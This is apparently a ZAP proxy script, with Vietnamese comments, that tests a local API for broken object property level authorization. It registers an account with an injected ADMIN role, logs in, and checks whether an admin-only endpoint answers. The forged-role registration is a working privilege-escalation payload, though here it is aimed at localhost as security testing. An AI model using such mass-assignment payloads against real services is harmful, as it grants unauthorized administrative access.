// Java class mapping
var HttpSender = Java.type("org.parosproxy.paros.network.HttpSender");
var HttpMessage = Java.type("org.parosproxy.paros.network.HttpMessage");
var URI = Java.type("org.apache.commons.httpclient.URI");
var HttpHeader = Java.type("org.parosproxy.paros.network.HttpHeader");
var FileWriter = Java.type("java.io.FileWriter");
var BufferedWriter = Java.type("java.io.BufferedWriter");
var SimpleDateFormat = Java.type("java.text.SimpleDateFormat");
var Date = Java.type("java.util.Date");

// === Thông tin API ===
var registerUrl = "http://localhost:8080/user/register";
var loginUrl = "http://localhost:8080/auth/log-in";
var adminTestUrl = "http://localhost:8080/user/all"; // API chỉ dành cho ADMIN

// === Thông tin giả mạo ===
var username = "nghiatestboplaFIXED";
var password = "nghiatestboplaFIXED";
var forgedBody = {
	username: username,
  firstName: username,
  lastName: username,
  password: password,
  email: username + "@gmail.com",
 	roles: ["ADMIN"]
};

var loginBody = JSON.stringify({
  username: username,
  password: password
});

var token = null;

// === Log file ===
var logFile = "/zap/wrk/scan-log.txt";
var writer = new BufferedWriter(new FileWriter(logFile, true)); // mở file ở chế độ append

writer.write("[API3.js] Gửi request đến ...\n");
writer.flush();
writer.close();

var formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");

function initLog() {
  writer = new BufferedWriter(new FileWriter(logFile, true));
  var now = formatter.format(new Date());
  writer.write("\n=== API3 BOPLA Test - " + now + " ===\n");
  writer.flush();
}

function cleanup() {
  if (writer != null) {
    writer.close();
  }
}

// === Đăng ký tài khoản với quyền ADMIN chèn trái phép
function registerWithForgedRole() {
  try {
    var registerMsg = new HttpMessage(new URI(registerUrl, false));
    var header = registerMsg.getRequestHeader();

    header.setMethod("POST");
    header.setHeader(HttpHeader.CONTENT_TYPE, "application/json");

    var jsonBody = JSON.stringify(forgedBody);
    registerMsg.setRequestBody(jsonBody);
    header.setContentLength(jsonBody.length);

    var sender = new HttpSender(HttpSender.MANUAL_REQUEST_INITIATOR);
    sender.sendAndReceive(registerMsg, true);

    var status = registerMsg.getResponseHeader().getStatusCode();
    print("[*] Registration request sent. Status: " + status);

  } catch (e) {
    print("[ERROR] Registration failed: " + e);
  }
}

// === Đăng nhập và lấy token
function getJwtToken() {
  try {
    var loginMsg = new HttpMessage(new URI(loginUrl, false));
    loginMsg
		.getRequestHeader()
		.setMethod("POST");
    loginMsg
		.getRequestHeader()
		.setHeader(HttpHeader.CONTENT_TYPE, "application/json");
    loginMsg
		.setRequestBody(loginBody);
    loginMsg
		.getRequestHeader().setContentLength(loginBody.length);

    var sender = new HttpSender(HttpSender.MANUAL_REQUEST_INITIATOR);
    sender.sendAndReceive(loginMsg, true);

    var response = loginMsg.getResponseBody().toString();
    var parsed = JSON.parse(response);

    return parsed.token;
  } catch (e) {
    print("[ERROR] Login failed: " + e);
    return null;
  }
}

// === Gửi request truy cập API dành cho ADMIN
function testAdminAccess(token) {
  try {
    var testMsg = new HttpMessage(new URI(adminTestUrl, false));
    var header = testMsg.getRequestHeader();

    header.setMethod("GET");
    header.setHeader("Authorization", "Bearer " + token);

    var sender = new HttpSender(HttpSender.MANUAL_REQUEST_INITIATOR);
    sender.sendAndReceive(testMsg, true);

    var status = testMsg.getResponseHeader().getStatusCode();
    var timestamp = formatter.format(new Date());

    if (status === 200) {
      print("[!] BOPLA DETECTED: User accessed ADMIN API!");
      writer.write(timestamp + " [VULNERABLE] Accessed /user/all with forged role\n");
    } else {
      print("[+] SAFE: Access to ADMIN API was denied (" + status + ")");
      writer.write(timestamp + " [SAFE] Access to /user/all denied (" + status + ")\n");
    }
    writer.flush();
  } catch (e) {
    print("[ERROR] Admin access test failed: " + e);
  }
}

// === Hàm chính chạy khi gửi request đăng ký
function sendingRequest(msg, initiator, helper) {
  var uri = msg.getRequestHeader().getURI().toString();

  if (uri.contains("/user/register")) {
    if (writer == null) {
      initLog();
    }

    registerWithForgedRole();

    token = getJwtToken();
    if (!token) {
      print("[ERROR] Could not get JWT token after registration.");
      cleanup();
      return;
    }

    testAdminAccess(token);
    cleanup();
  }
}

function responseReceived(msg, initiator, helper) {
  // Không cần xử lý phản hồi chính gốc
}
